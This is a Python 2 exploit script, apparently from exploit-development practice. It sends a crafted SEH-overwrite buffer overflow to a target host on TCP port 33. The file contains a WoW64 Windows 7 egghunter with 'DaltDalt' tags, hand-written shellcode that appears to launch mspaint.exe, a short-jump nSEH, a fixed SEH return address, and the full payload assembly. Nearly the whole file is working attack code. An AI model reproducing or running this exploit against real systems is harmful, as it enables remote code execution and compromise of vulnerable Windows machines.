import os
import sys
import socket

ip = sys.argv[1]
socket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
socket.connect((ip , 33))


#modern egghunter for wow64 - Windows 7
eggh = (
"\xCC"  # Int 3
"\x31\xdb"                            # XOR EBX, EBX
"\x53"                                # PUSH EBX
"\x53"                                # PUSH EBX
"\x53"                                # PUSH EBX
"\x53"                                # PUSH EBX
"\xb3\xc0"			      			  # MOV BL,0xc0
"\x66\x81\xCA\xFF\x0F"                # OR DX,0FFF

# Edit - Moving Egghunter close to start of tag
# "\x89\xEA"                            # mov edx, ebp
# "\x81\xC2\xF7\x04\x00\x00"            # add edx, 0x4f7 <- 1271 (decimal This may be too close unless offset is always the same
# "\x81\xC2\xE8\x03\x00\x00"            # add edx, 0x3e8 (decimal 1000) < Tried something a little farther away, failed.
### 
# "\x8B\x15\x00\x00\x00\x00" # mov edx, eip
# "\x81\xC2\x6D\xEE\x07\x00" # add edx, 0x7ee6d (decimal 519789)
# "\x89\xE0\x5A\x5A\x5A\x5A\x5A\x5A\x5A\x5A\x89\xC4"
"\x89\xE0\x5A\x5A\x5A\x5A\x5A\x5A\x5A\x5A\x89\xC4\x81\xEA\x2C\x01\x00\x00"

"\x42"                                # INC EDX
"\x52"                                # PUSH EDX
"\x6A\x26"    						  # PUSH 26 
"\x58"                                # POP EAX
"\x33\xC9"     						  # XOR ECX,ECX
"\x8B\xD4"      					  # MOV EDX,ESP
"\x64\xff\x13"         				  # CALL DWORD PTR FS:[ebx]
"\x5e"                                # POP ESI
"\x5a"                                # POP EDX
"\x3C\x05"      					  # CMP AL,5
"\x74\xe9"      					  # JE SHORT egg.0043F000
"\xB8\x44\x61\x6c\x74"       		  # MOV EAX,44716c74 Dalt
"\x8B\xFA"                            # MOV EDI,EDX
"\xAF"                                # SCAS DWORD PTR ES:[EDI]
"\x75\xe4"                            # JNZ SHORT egg.0043F001
"\xAF"                                # SCAS DWORD PTR ES:[EDI]
"\x75\xe1"                            # JNZ SHORT 0043F001
"\xFF\xE7"                            # JMP EDI
)


shellcode = (
"\xe8\x00\x00\x00\x00\x5a\x8d\x52"
"\xfb\x52\xbb\x8e\xfe\x1f\x4b\xe8"
"\x32\x00\x00\x00\x5a\x55\x52\x89"
"\xc5\x8d\xb2\xed\x00\x00\x00\x8d"
"\xba\xf9\x00\x00\x00\xe8\x52\x00"
"\x00\x00\x5a\x5d\x8d\xb2\xe1\x00"
"\x00\x00\x6a\x00\x56\xff\xb2\xfd"
"\x00\x00\x00\x58\xff\xd0\x6a\x00"
"\xff\x92\xf9\x00\x00\x00\xfc\x31"
"\xff\x64\x8b\x3d\x30\x00\x00\x00"
"\x8b\x7f\x0c\x8b\x7f\x14\x8b\x77"
"\x28\x31\xd2\x66\xad\x84\xc0\x74"
"\x11\x3c\x41\x72\x06\x3c\x5a\x77"
"\x02\x0c\x20\xc1\xc2\x07\x30\xc2"
"\xeb\xe9\x39\xda\x8b\x47\x10\x8b"
"\x3f\x75\xdb\xc3\x89\xea\x03\x52"
"\x3c\x8b\x52\x78\x01\xea\x8b\x5a"
"\x20\x01\xeb\x31\xc9\x57\x56\x8b"
"\x36\x8b\x3b\x01\xef\x52\x31\xd2"
"\xc1\xc2\x07\x32\x17\x47\x80\x3f"
"\x00\x75\xf5\x92\x5a\x39\xf0\x74"
"\x0c\x83\xc3\x04\x41\x39\x4a\x18"
"\x75\xdf\x5e\x5f\xc3\x5e\x5f\xad"
"\x56\x53\x89\xeb\x89\xde\x03\x5a"
"\x24\x8d\x04\x4b\x0f\xb7\x00\x8d"
"\x04\x86\x03\x42\x1c\x8b\x00\x01"
"\xf0\xab\x5b\x5e\x83\xc3\x04\x41"
"\x81\x3e\xff\xff\x00\x00\x75\xad"
"\xc3\x6d\x73\x70\x61\x69\x6e\x74"
"\x2e\x65\x78\x65\x00\x19\x2b\x90"
"\x95\xad\x6d\xbf\xe8\xff\xff\x00"
"\x00\x00\x00\x00\x00\x01\x00\x00"
"\x00"
)




# payload = evil + nseh + seh + nops + shellcode
# payload = shellA + eggh + nseh + seh + nops + eggh + "DaltDalt" + shellB

# Shellcode length = 257 bytes
# payload = "DaltDalt" + shellcode + nseh + seh + nops + eggh

junk = "A" * 50
tag = "DaltDalt"
nseh = "\xeb\x06\x90\x90"
seh = "\xdb\x65\x41\x00" #004165db
nops = "\x90"*100
morejunk = "B" * (330-(len(junk)+len(tag)+len(shellcode)))

# Full payload calculation
payload = junk + tag + shellcode + morejunk + nseh + seh + nops + eggh



socket.send(payload)
d = socket.recv(1024)
print d

